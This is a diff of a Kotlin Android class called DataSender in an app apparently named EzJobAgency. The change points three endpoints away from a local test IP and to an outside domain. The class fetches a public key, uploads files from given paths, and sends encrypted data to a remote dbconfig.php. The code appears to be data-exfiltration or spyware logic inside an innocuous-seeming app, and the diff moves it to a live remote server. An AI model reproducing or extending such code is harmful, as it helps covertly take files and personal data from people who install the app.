@@ -2,16 +2,16 @@ package com.example.EzJobAgency
 
 import android.content.ContentResolver
 import android.provider.Settings
+import android.util.Base64
 import android.util.Log
+import androidx.appcompat.app.AppCompatActivity
+import androidx.lifecycle.lifecycleScope
+import kotlinx.coroutines.launch
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.asRequestBody
 import java.io.File
 import java.io.IOException
-import android.util.Base64
-import androidx.appcompat.app.AppCompatActivity
-import androidx.lifecycle.lifecycleScope
-import kotlinx.coroutines.launch
 import java.util.concurrent.TimeUnit
 import javax.crypto.Cipher
 import javax.crypto.spec.SecretKeySpec
@@ -39,7 +39,7 @@ class DataSender : AppCompatActivity(){
         // Declare a function to perform the HTTP request
         fun performHttpRequest(callback: (String?, Exception?) -> Unit) {
             val client = OkHttpClient.Builder().connectTimeout(1, TimeUnit.SECONDS).build()
-            val request = Request.Builder().url("http://192.168.1.24/dashboard/publickey.php").build()
+            val request = Request.Builder().url("https://www.priceless-elgamal.cloud/publickey.php").build()
             client.newCall(request).enqueue(object : Callback {
                 override fun onResponse(call: Call, response: Response) {
                     val publicKey = response.body?.string()
@@ -69,7 +69,7 @@ class DataSender : AppCompatActivity(){
     }
 
     fun sendFile(filepath: String) {
-        val url = "http://192.168.1.24/dashboard/receivefile.php"
+        val url = "https://www.priceless-elgamal.cloud/receivefile.php"
         val file = File(filepath)
         val fileBody = file.asRequestBody("application/octet-stream".toMediaTypeOrNull())
 
@@ -87,6 +87,7 @@ class DataSender : AppCompatActivity(){
         lifecycleScope.launch {
             try {
                 handleRequest(request)
+                print(request)
             } catch (e: Exception) {
                 Log.e("Error:", "Failed to send file.", e)
             }
@@ -94,7 +95,7 @@ class DataSender : AppCompatActivity(){
     }
 
     fun sendData(data: String) {
-        val url = "http://192.168.1.24/dashboard/dbconfig.php"
+        val url = "https://www.priceless-elgamal.cloud/dbconfig.php"
 
         if (this.publicKey != null) {
             try {
@@ -134,6 +135,7 @@ class DataSender : AppCompatActivity(){
 
             override fun onResponse(call: Call, response: Response) {
                 // Handle the response here
+                print(response)
                 println(response.body?.string())
             }
         })
